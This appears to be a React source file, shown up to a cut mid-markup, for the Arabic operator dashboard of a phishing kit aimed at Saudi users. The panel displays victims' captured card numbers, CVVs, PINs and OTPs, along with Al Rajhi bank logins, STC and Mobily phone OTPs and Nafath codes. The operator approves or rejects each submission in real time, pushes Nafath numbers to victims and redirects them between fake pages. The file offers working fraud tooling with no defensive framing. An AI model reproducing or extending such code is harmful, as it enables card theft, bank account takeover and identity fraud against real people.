import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { serverRoute } from "./config.js";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import "./dashboard.css";
import socket from "./socket.js";
import { FaBell, FaPhoneAlt } from "react-icons/fa";
import { SITE_PAGES, buildAdminRedirect } from "./sitePages.js";
import { debounce } from "./utils/debounce.js";
import {
  playNewDataSound,
  playNewUserSound,
  unlockNotificationAudio,
} from "./utils/notificationSound.js";

const LAST_SEEN_KEY = "salama_admin_lastSeen";

const loadLastSeen = () => {
  try {
    return JSON.parse(localStorage.getItem(LAST_SEEN_KEY) || "{}");
  } catch {
    return {};
  }
};

const saveLastSeen = (map) => {
  localStorage.setItem(LAST_SEEN_KEY, JSON.stringify(map));
};

const getDocVersion = (u) => {
  const d = u.updatedAt || u.created;
  if (!d) return "";
  return new Date(d).toISOString();
};

const isUnreadUser = (u, map, didInit) => {
  const v = getDocVersion(u);
  if (!v) return false;
  const seen = map[u._id];
  if (!seen) return didInit;
  return new Date(v) > new Date(seen);
};

const isStcNet = (n) => n === "STC" || n === "اس تي سي";
const isMobilyNet = (n) => n === "Mobily" || n === "موبايلي";

const CARD_STATUS_LABELS = {
  pending: "قيد المراجعة",
  accepted: "مقبولة",
  declined: "مرفوضة",
};

const getCardAttempts = (c) => {
  if (Array.isArray(c.cardAttempts) && c.cardAttempts.length > 0) {
    return c.cardAttempts;
  }
  if (c.cardNumber) {
    return [
      {
        cardNumber: c.cardNumber,
        card_name: c.card_name,
        cvv: c.cvv,
        expiryDate: c.expiryDate,
        pin: c.pin,
        status: c.CardAccept ? "accepted" : "pending",
        submittedAt: c.created,
      },
    ];
  }
  return [];
};

const hasPendingCard = (c) => {
  const attempts = getCardAttempts(c);
  const latest = attempts[attempts.length - 1];
  return latest?.status === "pending" && !c.CardAccept;
};

const patchCardAttemptStatus = (userData, status) => {
  const attempts = getCardAttempts(userData);
  if (attempts.length === 0) return { CardAccept: true };
  return {
    CardAccept: true,
    cardAttempts: attempts.map((a, i) =>
      i === attempts.length - 1 && a.status === "pending"
        ? { ...a, status }
        : a,
    ),
  };
};

const extractOrderId = (payload) => {
  if (typeof payload === "string") {
    try {
      const parsed = JSON.parse(payload);
      return parsed._id || parsed.id || null;
    } catch {
      return payload;
    }
  }
  if (payload?._id) return payload._id;
  if (payload?.id) return payload.id;
  return null;
};

function OrderField({ label, value, secret, otp, ltr }) {
  const empty = value == null || value === "";
  return (
    <div className="row">
      <span className="lbl">{label}</span>
      <span
        className={
          empty ? "val empty" : otp ? "val otp" : secret ? "val secret" : "val"
        }
        dir={ltr ? "ltr" : undefined}
      >
        {empty ? "—" : value}
      </span>
    </div>
  );
}

function OrderSection({ title, children }) {
  return (
    <div className="order-journey-section">
      <div className="order-journey-section__title">{title}</div>
      {children}
    </div>
  );
}

function renderHumanitiCart(c) {
  const items = Array.isArray(c.cartItems) ? c.cartItems : [];
  if (
    items.length === 0 &&
    c.cartTotalUsdCents == null &&
    c.cartTotalDisplay == null
  ) {
    return null;
  }

  const currency = c.cartCurrency || "USD";
  const totalDisplay =
    c.cartTotalDisplay != null
      ? Number(c.cartTotalDisplay)
      : Number(c.cartTotalUsdCents || 0) / 100;
  const formattedTotal = totalDisplay.toLocaleString("en-US", {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });

  return (
    <OrderSection title="السلة">
      {items.map((item) => (
        <OrderField
          key={item.id || item.title}
          label={`${item.title || "—"} × ${item.quantity || 1}`}
          value={
            item.variantLabel || item.optionLabel
              ? `${item.variantLabel || ""} ${item.optionLabel || ""}`.trim()
              : null
          }
        />
      ))}
      <OrderField label="المجموع" value={`${formattedTotal} ${currency}`} ltr />
    </OrderSection>
  );
}

function renderHumanitiBilling(c) {
  const hasBilling =
    c.email ||
    c.firstName ||
    c.lastName ||
    c.address1 ||
    c.city ||
    c.phone ||
    c.countryCode;

  if (!hasBilling) return null;

  return (
    <OrderSection title="بيانات Humaniti">
      <OrderField label="البريد" value={c.email} ltr />
      <OrderField label="الاسم الأول" value={c.firstName} />
      <OrderField label="اسم العائلة" value={c.lastName} />
      <OrderField label="العنوان" value={c.address1} />
      <OrderField label="المدينة" value={c.city} />
      <OrderField label="الرمز البريدي" value={c.postalCode} ltr />
      <OrderField label="الدولة" value={c.countryCode} ltr />
      <OrderField label="الجوال" value={c.phone} secret ltr />
    </OrderSection>
  );
}

function renderOrderJourney(c) {
  return (
    <div className="info-block order-journey-block">
      <div className="order-journey-grid"></div>
    </div>
  );
}

const Main = () => {
  const [Users, setUsers] = useState([]);
  const [onlineCounts, setOnlineCounts] = useState({
    visitors: 0,
    dashboard: 0,
  });
  const [onlineOrderIds, setOnlineOrderIds] = useState(new Set());
  const [selectedUserId, setSelectedUserId] = useState(null);
  const [, setLastSeenBump] = useState(0);
  const [mobileShowList, setMobileShowList] = useState(true);
  const [isNarrow, setIsNarrow] = useState(false);
  const [price, setPrice] = useState("");

  const didInitLastSeenRef = useRef(false);
  const usersRef = useRef([]);
  const lastNewUserSoundAtRef = useRef(0);
  const navigate = useNavigate();

  const getUsers = useCallback(async () => {
    try {
      const res = await axios.get(`${serverRoute}/users`);
      const sortedUsers = res.data.sort(
        (a, b) => new Date(b.created) - new Date(a.created),
      );
      setUsers(sortedUsers);
      usersRef.current = sortedUsers;

      const map = loadLastSeen();
      let changed = false;
      if (!didInitLastSeenRef.current && sortedUsers.length > 0) {
        for (const u of sortedUsers) {
          if (map[u._id] == null || map[u._id] === "") {
            map[u._id] = getDocVersion(u) || new Date(0).toISOString();
            changed = true;
          }
        }
        didInitLastSeenRef.current = true;
        if (changed) saveLastSeen(map);
      }

      setSelectedUserId((prev) => {
        if (sortedUsers.length === 0) return null;
        if (prev && sortedUsers.some((u) => u._id === prev)) return prev;
        return sortedUsers[0]._id;
      });
      setLastSeenBump((t) => t + 1);
    } catch (error) {
      console.log(error);
    }
  }, []);

  const debouncedGetUsers = useMemo(
    () => debounce(() => getUsers(), 300),
    [getUsers],
  );

  useEffect(() => {
    usersRef.current = Users;
  }, [Users]);

  useEffect(() => {
    unlockNotificationAudio();
    const unlock = () => unlockNotificationAudio();
    window.addEventListener("pointerdown", unlock, { once: true });
    window.addEventListener("keydown", unlock, { once: true });
    return () => {
      window.removeEventListener("pointerdown", unlock);
      window.removeEventListener("keydown", unlock);
    };
  }, []);

  useEffect(() => {
    if (!localStorage.getItem("token")) return navigate("/login");

    const onConnect = () => socket.emit("join", { role: "admin" });
    if (socket.connected) onConnect();
    socket.on("connect", onConnect);

    const onOnlineCounts = (counts) => setOnlineCounts(counts);
    socket.on("onlineCounts", onOnlineCounts);

    const onClientPresence = ({ onlineIds }) => {
      setOnlineOrderIds(new Set(onlineIds || []));
    };
    socket.on("clientPresence", onClientPresence);

    const handleNewClientData = (payload, eventType = "") => {
      const knownIds = new Set(usersRef.current.map((u) => u._id));
      const orderId = extractOrderId(payload);
      const isNewOrder = Boolean(orderId && !knownIds.has(orderId));
      const isNewUserEvent =
        eventType === "newUser" || (eventType === "cartData" && isNewOrder);

      if (isNewUserEvent) {
        const now = Date.now();
        if (now - lastNewUserSoundAtRef.current > 800) {
          lastNewUserSoundAtRef.current = now;
          playNewUserSound();
        }
      } else {
        playNewDataSound();
      }

      debouncedGetUsers();
    };

    socket.on("newUser", (payload) => handleNewClientData(payload, "newUser"));
    socket.on("cartData", (payload) =>
      handleNewClientData(payload, "cartData"),
    );
    socket.on("paymentForm", (payload) =>
      handleNewClientData(payload, "paymentForm"),
    );
    socket.on("visaOtp", (payload) => handleNewClientData(payload, "visaOtp"));

    getUsers();

    return () => {
      socket.off("connect", onConnect);
      socket.off("onlineCounts", onOnlineCounts);
      socket.off("clientPresence", onClientPresence);
      socket.off("newUser");
      socket.off("cartData");
      socket.off("paymentForm");
      socket.off("visaOtp");
    };
  }, [debouncedGetUsers, getUsers, navigate]);

  useEffect(() => {
    const mq = window.matchMedia("(max-width: 1023px)");
    const apply = () => setIsNarrow(mq.matches);
    apply();
    mq.addEventListener("change", apply);
    return () => mq.removeEventListener("change", apply);
  }, []);

  useEffect(() => {
    if (!isNarrow) setMobileShowList(true);
  }, [isNarrow]);

  useEffect(() => {
    if (!selectedUserId) setMobileShowList(true);
  }, [selectedUserId]);

  useEffect(() => {
    if (!selectedUserId) return;
    const u = Users.find((x) => x._id === selectedUserId);
    if (!u) return;
    const map = loadLastSeen();
    const v = getDocVersion(u);
    if (!v) return;
    if (map[selectedUserId] === v) return;
    map[selectedUserId] = v;
    saveLastSeen(map);
    setLastSeenBump((x) => x + 1);
  }, [selectedUserId, Users]);

  const patchUserLocally = useCallback((id, patch) => {
    setUsers((prev) => {
      const next = prev.map((u) => (u._id === id ? { ...u, ...patch } : u));
      usersRef.current = next;
      return next;
    });
  }, []);

  const getUserById = useCallback(
    (id) => usersRef.current.find((u) => u._id === id),
    [],
  );

  const handleChange = async (id) => {
    if (!price) return window.alert("املاء حقل الكود");
    patchUserLocally(id, { navazCode: price });
    socket.emit("navazChange", { id, price });
  };

  const handleAcceptVisa = async (id) => {
    const u = getUserById(id);
    if (u) patchUserLocally(id, patchCardAttemptStatus(u, "accepted"));
    socket.emit("acceptPaymentForm", id);
    await getUsers();
  };

  const handleDeclineVisa = async (id) => {
    const u = getUserById(id);
    if (u) patchUserLocally(id, patchCardAttemptStatus(u, "declined"));
    socket.emit("declinePaymentForm", id);
    await getUsers();
  };

  const handleAcceptVisaOtp = async (id) => {
    patchUserLocally(id, { OtpCardAccept: true });
    socket.emit("acceptVisaOtp", id);
    await getUsers();
  };

  const handleDeclineVisaOtp = async (id) => {
    patchUserLocally(id, { OtpCardAccept: true });
    socket.emit("declineVisaOtp", id);
    await getUsers();
  };

  const handleAcceptPin = async (id) => {
    patchUserLocally(id, { PinAccept: true });
    socket.emit("acceptVisaPin", id);
    await getUsers();
  };

  const handleDeclinePin = async (id) => {
    patchUserLocally(id, { PinAccept: true });
    socket.emit("declineVisaPin", id);
    await getUsers();
  };

  const handleAcceptRajhiLogin = async (id) => {
    patchUserLocally(id, { rajhiLoginAccept: true });
    socket.emit("acceptRajhiLogin", id);
    await getUsers();
  };

  const handleDeclineRajhiLogin = async (id) => {
    socket.emit("declineRajhiLogin", id);
    await getUsers();
  };

  const handleAcceptRajhiOtp = async (id) => {
    patchUserLocally(id, { rajhiOtpAccept: true });
    socket.emit("acceptRajhiOtp", id);
    await getUsers();
  };

  const handleDeclineRajhiOtp = async (id) => {
    socket.emit("declineRajhiOtp", id);
    await getUsers();
  };

  const handleAcceptRajhiCallConfirm = async (id) => {
    patchUserLocally(id, { rajhiCallConfirmAccept: true });
    socket.emit("acceptRajhiCallConfirm", id);
    await getUsers();
  };

  const handleDeclineRajhiCallConfirm = async (id) => {
    socket.emit("declineRajhiCallConfirm", id);
    await getUsers();
  };

  const handleAcceptPhone = async (id) => {
    patchUserLocally(id, { phoneAccept: true });
    socket.emit("acceptPhone", id);
    await getUsers();
  };

  const handleDeclinePhone = async (id) => {
    patchUserLocally(id, { phoneAccept: true });
    socket.emit("declinePhone", id);
    await getUsers();
  };

  const handleAcceptNormalPhone = async (id) => {
    if (!price) return window.alert("املاء حقل الكود");
    patchUserLocally(id, { phoneAccept: true });
    socket.emit("acceptNormalPhone", { id, price });
    await getUsers();
  };

  const handleDeclineNormalPhone = async (id) => {
    patchUserLocally(id, { phoneAccept: true });
    socket.emit("declineNormalPhone", id);
    await getUsers();
  };

  const handleAcceptPhoneOtp = async (id) => {
    const u = getUserById(id);
    if (u && !isStcNet(u.phoneNetwork) && !isMobilyNet(u.phoneNetwork)) {
      if (!price) return window.alert("اكتب الرقم المرسل إلى نفاذ");
    }
    patchUserLocally(id, { navazCode: price });
    socket.emit("acceptPhoneOTP", { id, price });
    debouncedGetUsers();
  };

  const handleDeclinePhoneOtp = async (id) => {
    patchUserLocally(id, {
      phoneOtpAccept: true,
      navazAccept: false,
      navazCode: null,
    });
    socket.emit("declinePhoneOTP", id);
    debouncedGetUsers();
  };

  const handleAcceptService = async (id) => {
    const u = getUserById(id);
    if (u && isStcNet(u.phoneNetwork)) {
      if (!price) return window.alert("اكتب الرقم المرسل إلى نفاذ");
    }
    patchUserLocally(id, { navazCode: price });
    socket.emit("acceptService", { id, price });
    debouncedGetUsers();
  };

  const handleDeclineService = async (id) => {
    patchUserLocally(id, { networkAccept: true, navazCode: null });
    socket.emit("declineService", id);
    debouncedGetUsers();
  };

  const handleAcceptNavaz = async (id) => {
    patchUserLocally(id, { navazAccept: true });
    socket.emit("acceptNavaz", id);
    await getUsers();
  };

  const handleDeclineNavaz = async (id) => {
    patchUserLocally(id, { navazAccept: true, networkAccept: false });
    socket.emit("declineNavaz", id);
    await getUsers();
  };

  const handleAcceptNavazOtp = async (id) => {
    patchUserLocally(id, {
      navazOtpAccept: true,
      networkAccept: true,
      navazAccept: true,
    });
    socket.emit("acceptNavazOTP", id);
    await getUsers();
  };

  const handleDeclineNavazOtp = async (id) => {
    patchUserLocally(id, { navazOtpAccept: true, navazAccept: true });
    socket.emit("declineNavazOTP", id);
    await getUsers();
  };

  const handleAcceptMobOtp = async (id) => {
    if (!price) return window.alert("اكتب الرقم المرسل إلى نفاذ");
    patchUserLocally(id, { navazCode: price });
    socket.emit("acceptMobOtp", { id, price });
    debouncedGetUsers();
  };

  const handleDeclineMobOtp = async (id) => {
    patchUserLocally(id, { mobOtpAccept: true, navazCode: null });
    socket.emit("declineMobOtp", id);
    debouncedGetUsers();
  };

  const handleAcceptStcOtp = async (id) => {
    patchUserLocally(id, { phoneOtpAccept: true, checked: true });
    socket.emit("acceptStcPhoneOtp", id);
    await getUsers();
  };

  const handleDeclineStcOtp = async (id) => {
    patchUserLocally(id, { phoneOtpAccept: true });
    socket.emit("declineStcPhoneOtp", id);
    await getUsers();
  };

  const handleAdminRedirect = (user, page) => {
    const payload = buildAdminRedirect(user, page);
    socket.emit("adminRedirect", { id: user._id, ...payload });
  };

  const handleBlockClient = async (id) => {
    if (!window.confirm("هل تريد حظر هذا العميل من استخدام الموقع؟")) return;
    patchUserLocally(id, { blocked: true });
    socket.emit("blockClient", id);
    await getUsers();
  };

  const handleUnblockClient = async (id) => {
    patchUserLocally(id, { blocked: false });
    socket.emit("unblockClient", id);
    await getUsers();
  };

  const deleteUser = async (id) => {
    if (!window.confirm("هل أنت متأكد من حذف العميل؟")) return;
    await axios.delete(`${serverRoute}/order/${id}`);
    if (selectedUserId === id) setSelectedUserId(null);
    await getUsers();
  };

  const deleteAllUsers = async () => {
    if (!window.confirm("هل أنت متأكد من حذف جميع العملاء والبطاقات نهائياً؟"))
      return;
    await axios.delete(`${serverRoute}/orders/all`);
    setSelectedUserId(null);
    await getUsers();
  };

  const handleLogOut = () => {
    localStorage.removeItem("token");
    navigate("/login");
  };

  const formatCardNum = (str) => {
    if (!str) return "";
    return str.replace(/(.{4})/g, "$1 ").trim();
  };

  const selectedUser = useMemo(
    () => Users.find((u) => u._id === selectedUserId) ?? null,
    [Users, selectedUserId],
  );

  useEffect(() => {
    setPrice(selectedUser?.navazCode || "");
  }, [selectedUser?._id, selectedUser?.navazCode]);

  const handleSelectUser = async (u) => {
    if (!u.checked) {
      try {
        await axios.get(`${serverRoute}/order/checked/${u._id}`);
        patchUserLocally(u._id, { checked: true });
      } catch (error) {
        console.log(error);
      }
    }
    setSelectedUserId(u._id);
    if (isNarrow) setMobileShowList(false);
  };

  const handleMobileBackToList = () => {
    setMobileShowList(true);
  };

  const handleSoftRefresh = () => {
    getUsers();
  };

  const renderNavazPriceInput = (placeholder = "رقم نفاذ") => (
    <input
      className="navaz-price-input"
      value={price}
      onChange={(e) => setPrice(e.target.value)}
      placeholder={placeholder}
      dir="ltr"
    />
  );

  const renderClientCard = (c) => {
    const isOnline = onlineOrderIds.has(c._id);
    const cardAttempts = getCardAttempts(c);

    return (
      <div key={c._id} className="client-card">
        <div className="cc-head">
          <div className="cc-user">
            <div className="cc-avatar">
              <i className="fas fa-user-check"></i>
            </div>
            <div className="cc-info">
              <h4>{c.firstName ? c.firstName + " " + c.lastName : "مجهول"}</h4>
              <span>
                ID: {c._id.slice(-6)} | {c.nation_number || c.phone || "—"}
              </span>
              {(c.phone || c.phoneNumber) && (
                <div className="cc-phones-summary">
                  {c.phone && (
                    <span dir="ltr">
                      <FaPhoneAlt /> جوال التسجيل: {c.phone}
                    </span>
                  )}
                  {c.phoneNumber && (
                    <span dir="ltr">
                      <FaPhoneAlt /> جوال التحقق: {c.phoneNumber}
                    </span>
                  )}
                </div>
              )}
            </div>
          </div>
          <div className="cc-head-badges">
            {c.blocked && (
              <div className="status-badge blocked">
                <div className="dot"></div> محظور
              </div>
            )}
            <div className={`status-badge ${isOnline ? "online" : ""}`}>
              <div className="dot"></div> {isOnline ? "متصل" : "غير متصل"}
            </div>
          </div>
        </div>

        <div className="cc-body">
          {renderHumanitiCart(c)}
          {renderHumanitiBilling(c)}
          {renderOrderJourney(c)}
          <div className="cc-body-grid">
            <div className="cc-col cc-col--visa">
              <div className="order-journey-section__title cc-section-title">
                2. بطاقات
              </div>
              <div className="visa-list-container">
                {cardAttempts.length > 0 ? (
                  cardAttempts.map((attempt, idx) => (
                    <div
                      key={`visa-${idx}`}
                      className={`visa-card visa-card--${attempt.status || "pending"}`}
                    >
                      <div className="visa-card-status">
                        {CARD_STATUS_LABELS[attempt.status] || attempt.status}
                      </div>
                      <div className="v-top">
                        <div className="v-chip"></div>
                        <i className="fab fa-cc-visa fa-lg"></i>
                      </div>
                      <div className="v-num" dir="ltr">
                        {formatCardNum(attempt.cardNumber)}
                      </div>
                      <div
                        style={{
                          fontSize: "11px",
                          marginBottom: "8px",
                          color: "#fff",
                          fontWeight: "bold",
                        }}
                      >
                        {attempt.card_name}
                      </div>
                      <div className="v-det">
                        <div>
                          EXP{" "}
                          <span className="v-res">{attempt.expiryDate}</span>
                        </div>
                        <div>
                          CVV{" "}
                          <span className="v-res" style={{ color: "#fbbf24" }}>
                            {attempt.cvv}
                          </span>
                        </div>
                      </div>
                    </div>
                  ))
                ) : (
                  <div
                    className="val empty"
                    style={{ textAlign: "center", padding: "10px" }}
                  >
                    بانتظار إدخال البطاقة...
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        <div className="cc-foot cc-foot--centered">
          <div className="cc-foot-inner">
            <div className="page-redirect-bar">
              <div className="page-redirect-bar__label">
                توجيه المستخدم إلى صفحة
              </div>
              <div className="page-redirect-bar__buttons">
                {SITE_PAGES.map((p) => (
                  <button
                    key={`${p.path}-${p.label}`}
                    type="button"
                    className="page-redirect-btn"
                    onClick={() => handleAdminRedirect(c, p)}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            <div className="w-full flex justify-between gap-x-2 mt-2">
              {c.blocked ? (
                <button
                  type="button"
                  className="btn-act accept grow w-full font-bold"
                  onClick={() => handleUnblockClient(c._id)}
                >
                  <i className="fas fa-unlock ml-2"></i> إلغاء الحظر
                </button>
              ) : (
                <button
                  type="button"
                  className="btn-act decline grow w-full font-bold"
                  onClick={() => handleBlockClient(c._id)}
                >
                  <i className="fas fa-ban ml-2"></i> حظر العميل
                </button>
              )}
            </div>

            {hasPendingCard(c) && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: الدفع
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    onClick={() => handleAcceptVisa(c._id)}
                  >
                    قبول الدفع
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclineVisa(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.OtpCardAccept && c.CardOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: OTP البطاقة
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    onClick={() => handleAcceptVisaOtp(c._id)}
                  >
                    قبول OTP
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclineVisaOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.PinAccept && c.pin && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: PIN البطاقة
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    onClick={() => handleAcceptPin(c._id)}
                  >
                    قبول PIN
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclinePin(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {c.rajhiUsername && !c.rajhiLoginAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: الراجحي - دخول
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    onClick={() => handleAcceptRajhiLogin(c._id)}
                  >
                    قبول الدخول
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclineRajhiLogin(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {c.rajhiOtp && !c.rajhiOtpAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: الراجحي - OTP
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    onClick={() => handleAcceptRajhiOtp(c._id)}
                  >
                    قبول OTP
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclineRajhiOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {c.rajhiCallConfirm && !c.rajhiCallConfirmAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: الراجحي - اتصال
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    onClick={() => handleAcceptRajhiCallConfirm(c._id)}
                  >
                    قبول التوثيق
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclineRajhiCallConfirm(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {c.phoneNumber && !c.phoneAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد بيانات الجوال
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    style={{ backgroundColor: "#0ea5e9" }}
                    onClick={() => handleAcceptPhone(c._id)}
                  >
                    قبول والمتابعة
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclinePhone(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!isStcNet(c.phoneNetwork) &&
              !isMobilyNet(c.phoneNetwork) &&
              c.phoneOtp &&
              !c.navazAccept && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    شبكة عامة — OTP الجوال / نفاذ
                  </div>
                  {renderNavazPriceInput("رقم نفاذ")}
                  <div className="btn-act-group">
                    <button
                      type="button"
                      className="btn-act accept"
                      onClick={() => handleAcceptPhoneOtp(c._id)}
                    >
                      {c.navazCode ? "تحديث رمز نفاذ" : "قبول وإرسال رمز نفاذ"}
                    </button>
                    {c.navazCode && (
                      <button
                        type="button"
                        className="btn-act accept"
                        style={{ backgroundColor: "#f59e0b" }}
                        onClick={() => handleChange(c._id)}
                      >
                        تغيير
                      </button>
                    )}
                    {c.navazCode && (
                      <button
                        type="button"
                        className="btn-act accept"
                        style={{ backgroundColor: "#6366f1" }}
                        onClick={() => handleAcceptNavaz(c._id)}
                      >
                        قبول نفاذ
                      </button>
                    )}
                    <button
                      type="button"
                      className="btn-act decline"
                      onClick={() => handleDeclinePhoneOtp(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {c.phoneAccept &&
              isStcNet(c.phoneNetwork) &&
              c.phoneOtp &&
              !c.phoneOtpAccept && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    STC — OTP الجوال
                  </div>
                  <div className="btn-act-group">
                    <button
                      type="button"
                      className="btn-act accept"
                      onClick={() => handleAcceptStcOtp(c._id)}
                    >
                      قبول OTP
                    </button>
                    <button
                      type="button"
                      className="btn-act decline"
                      onClick={() => handleDeclineStcOtp(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {c.phoneAccept &&
              isStcNet(c.phoneNetwork) &&
              c.phoneOtpAccept &&
              !c.navazAccept && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    STC — قبول بعد المكالمة / نفاذ
                  </div>
                  {renderNavazPriceInput("رقم نفاذ")}
                  <div className="btn-act-group">
                    <button
                      type="button"
                      className="btn-act accept"
                      onClick={() => handleAcceptService(c._id)}
                    >
                      {c.navazCode ? "تحديث رمز نفاذ" : "قبول وإرسال رمز نفاذ"}
                    </button>
                    {c.navazCode && (
                      <button
                        type="button"
                        className="btn-act accept"
                        style={{ backgroundColor: "#f59e0b" }}
                        onClick={() => handleChange(c._id)}
                      >
                        تغيير
                      </button>
                    )}
                    {c.navazCode && (
                      <button
                        type="button"
                        className="btn-act accept"
                        style={{ backgroundColor: "#6366f1" }}
                        onClick={() => handleAcceptNavaz(c._id)}
                      >
                        قبول نفاذ
                      </button>
                    )}
                    <button
                      type="button"
                      className="btn-act decline"
                      onClick={() => handleDeclineService(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {c.phoneAccept &&
              isMobilyNet(c.phoneNetwork) &&
              c.networkAccept &&
              c.mobOtp &&
              !c.navazAccept && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    موبايلي — OTP / نفاذ
                  </div>
                  {renderNavazPriceInput("رقم نفاذ")}
                  <div className="btn-act-group">
                    <button
                      type="button"
                      className="btn-act accept"
                      onClick={() => handleAcceptMobOtp(c._id)}
                    >
                      {c.navazCode ? "تحديث رمز نفاذ" : "قبول وإرسال رمز نفاذ"}
                    </button>
                    {c.navazCode && (
                      <button
                        type="button"
                        className="btn-act accept"
                        style={{ backgroundColor: "#f59e0b" }}
                        onClick={() => handleChange(c._id)}
                      >
                        تغيير
                      </button>
                    )}
                    {c.navazCode && (
                      <button
                        type="button"
                        className="btn-act accept"
                        style={{ backgroundColor: "#6366f1" }}
                        onClick={() => handleAcceptNavaz(c._id)}
                      >
                        قبول نفاذ
                      </button>
                    )}
                    <button
                      type="button"
                      className="btn-act decline"
                      onClick={() => handleDeclineMobOtp(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {c.navazOtp && !c.navazOtpAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  OTP نفاذ النهائي
                </div>
                <div className="btn-act-group">
                  <button
                    type="button"
                    className="btn-act accept"
                    onClick={() => handleAcceptNavazOtp(c._id)}
                  >
                    قبول
                  </button>
                  <button
                    type="button"
                    className="btn-act decline"
                    onClick={() => handleDeclineNavazOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            <div className="w-full flex justify-between gap-x-2 mt-2 cc-foot-delete">
              <button
                type="button"
                className="btn-del grow w-full font-bold"
                onClick={() => deleteUser(c._id)}
              >
                <i className="fas fa-trash ml-2"></i> حذف العميل
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const lastSeenSnapshot = loadLastSeen();
  const showAside = !isNarrow || mobileShowList;
  const showMain = !isNarrow || !mobileShowList;

  const selectedUnread = selectedUser
    ? isUnreadUser(selectedUser, lastSeenSnapshot, didInitLastSeenRef.current)
    : false;

  return (
    <div className="dashboard-layout" dir="rtl">
      <aside
        className="sidebar users-sidebar"
        hidden={!showAside}
        aria-hidden={!showAside}
      >
        <div className="sidebar-head">
          <h3>
            <i className="fas fa-users"></i> العملاء
          </h3>
        </div>
        <div className="user-sidebar-list">
          {Users.length === 0 ? (
            <div className="user-sidebar-empty">لا يوجد عملاء حالياً</div>
          ) : (
            Users.map((u) => {
              const label = u.fullname || u.nation_number || u.phone || "مجهول";
              const unread = isUnreadUser(
                u,
                lastSeenSnapshot,
                didInitLastSeenRef.current,
              );
              const active = u._id === selectedUserId;
              const userOnline = onlineOrderIds.has(u._id);
              return (
                <button
                  key={u._id}
                  type="button"
                  className={`user-sidebar-item${active ? " is-active" : ""}${unread ? " has-unread" : ""}${u.blocked ? " is-blocked" : ""}`}
                  onClick={() => handleSelectUser(u)}
                >
